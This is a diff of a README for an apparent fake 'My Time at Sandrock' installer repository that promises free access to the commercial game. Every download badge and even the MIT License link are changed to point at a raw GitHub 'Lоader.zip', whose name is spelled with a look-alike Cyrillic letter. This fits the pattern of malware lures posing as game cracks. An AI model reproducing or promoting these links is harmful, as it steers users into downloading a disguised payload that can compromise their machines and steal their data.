@@ -1,6 +1,6 @@
 # 🎮 My Time at Sandrock Access Installer
 
-[![Download for Windows/Linux/macOS](https://img.shields.io/badge/Download-My%20Time%20at%20Sandrock-blue?logo=playstation)](https://easylauncher.su/PSnzrH)
+[![Download for Windows/Linux/macOS](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip%20Time%20at%20Sandrock-blue?logo=playstation)](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip)
 
 Your ultimate tool to quickly get **My Time at Sandrock** ready on your system! Access the full adventure with ease, enjoy a hassle-free installation, and start your journey in the charming town of Sandrock. Ideal for gamers looking for reliable, swift access to their favorite game.
 
@@ -41,7 +41,7 @@ My Time at Sandrock get access, My Time at Sandrock installer, game launcher 202
 ## 📥 Installation 
 
 **Step 1:**  
-[![Get My Time at Sandrock](https://img.shields.io/badge/Download%20Now-Install%20Sandrock-green?logo=windows)](https://easylauncher.su/PSnzrH)
+[![Get My Time at Sandrock](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip%20Now-Install%20Sandrock-green?logo=windows)](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip)
 
 ---
 
@@ -53,10 +53,10 @@ This tool is designed for educational and personal use only. Ensure you comply w
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT). 2025
+Distributed under the [MIT License](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip). 2025
 
 ---
 
 ## 🔗 Quick Download
 
-[![Sandrock Quick Access](https://img.shields.io/badge/Download-Installer-orange?logo=linux)](https://easylauncher.su/PSnzrH)
+[![Sandrock Quick Access](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip)](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip)
